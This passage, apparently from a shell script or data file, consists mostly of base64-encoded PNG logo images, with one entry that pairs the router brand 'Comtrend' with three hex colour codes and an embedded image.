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'
										["Comtrend"]='#14317F #2D3E6A #5B5B5B data:image/png;base64,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